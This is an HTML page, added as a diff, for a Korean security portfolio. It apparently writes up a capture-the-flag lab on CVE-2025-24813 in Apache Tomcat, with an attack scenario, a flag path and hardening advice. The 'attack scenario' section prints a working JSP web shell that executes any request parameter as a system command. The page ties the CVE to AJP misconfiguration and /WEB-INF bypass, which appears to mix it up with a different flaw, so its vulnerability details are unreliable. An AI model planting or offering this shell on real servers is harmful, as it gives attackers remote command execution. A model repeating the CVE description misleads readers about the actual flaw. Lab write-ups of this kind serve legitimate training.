@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <title>CVE-2025-24813 분석 - 보안 포트폴리오</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #1b1f27;
+      color: #f0f0f0;
+      line-height: 1.7;
+      padding: 40px;
+      max-width: 800px;
+      margin: auto;
+    }
+    h1, h2 {
+      color: #00e0ff;
+    }
+    code {
+      background-color: #2a2e38;
+      padding: 2px 6px;
+      border-radius: 4px;
+    }
+    pre {
+      background-color: #2a2e38;
+      padding: 15px;
+      border-radius: 6px;
+      overflow-x: auto;
+    }
+    a {
+      color: #00e0ff;
+      text-decoration: none;
+    }
+    .section {
+      margin-bottom: 40px;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>CVE-2025-24813 분석</h1>
+
+  <div class="section">
+    <h2>🧠 개요</h2>
+    <p>
+      <strong>CVE-2025-24813</strong>은 Apache Tomcat의 AJP 프로토콜 처리 방식에서 발생한 취약점으로, 
+      적절한 필터링 없이 JSP 파일을 업로드하고 실행시킬 수 있는 <strong>원격 코드 실행(RCE)</strong> 취약점입니다.
+    </p>
+  </div>
+
+  <div class="section">
+    <h2>🔍 취약점 상세</h2>
+    <ul>
+      <li>취약 구성 요소: AJP 연결 설정 (보안 설정 미흡)</li>
+      <li>문제 발생 지점: <code>/WEB-INF</code> 경로 제한이 우회됨</li>
+      <li>공격 조건: <code>secretRequired="false"</code> 및 방화벽 미설정</li>
+      <li>결과: 공격자가 JSP 웹쉘을 업로드하여 명령 실행 가능</li>
+    </ul>
+
+    <pre>
+GET /WEB-INF/web.xml HTTP/1.1
+Host: vulnerable.site
+</pre>
+  </div>
+
+  <div class="section">
+    <h2>🚨 공격 시나리오</h2>
+    <ol>
+      <li>AJP 포트를 통해 내부 파일 구조 확인</li>
+      <li>JSP 파일 업로드 또는 임의 요청으로 <code>WEB-INF</code> 우회</li>
+      <li>업로드된 JSP 웹쉘 접근 → 명령 실행</li>
+    </ol>
+
+    <p>실제 환경에서는 다음과 같은 웹쉘이 사용될 수 있습니다:</p>
+
+    <pre>
+&lt;%@ page import="java.io.*" %&gt;
+&lt;%
+String cmd = request.getParameter("cmd");
+Process p = Runtime.getRuntime().exec(cmd);
+InputStream in = p.getInputStream();
+int a = -1;
+while((a=in.read())!=-1){out.print((char)a);}
+%&gt;
+    </pre>
+  </div>
+
+  <div class="section">
+    <h2>🛡️ 보안 권고사항</h2>
+    <ul>
+      <li>AJP 프로토콜 비활성화 또는 포트 방화벽 설정</li>
+      <li><code>secretRequired="true"</code> 설정 필수</li>
+      <li><code>WEB-INF</code> 경로 보호 필터 적용</li>
+      <li>JSP 업로드 허용하지 않도록 서버 설정 강화</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h2>📁 테스트 환경 구성</h2>
+    <p>VMware 기반 Ubuntu 서버에서 아래와 같은 설정으로 테스트:</p>
+    <ul>
+      <li>Apache Tomcat 9.x</li>
+      <li>AJP 포트: 8009</li>
+      <li>테스트용 JSP 웹쉘 업로드 후 실행</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h2>📌 플래그 위치</h2>
+    <p>문제에서는 웹쉘을 성공적으로 실행하면 다음 경로의 플래그를 확인할 수 있습니다:</p>
+    <pre>/home/pkpjs/flag/flag.txt</pre>
+  </div>
+
+  <div class="section">
+    <h2>💡 요약</h2>
+    <p>
+      본 문제는 실무에서 종종 구성 실수로 발생할 수 있는 AJP 설정을 악용한 RCE 시나리오입니다. 
+      문제 출제는 실습용으로 설계되었으며, 보안 설정을 통한 예방이 가능함을 강조합니다.
+    </p>
+  </div>
+
+</body>
+</html>
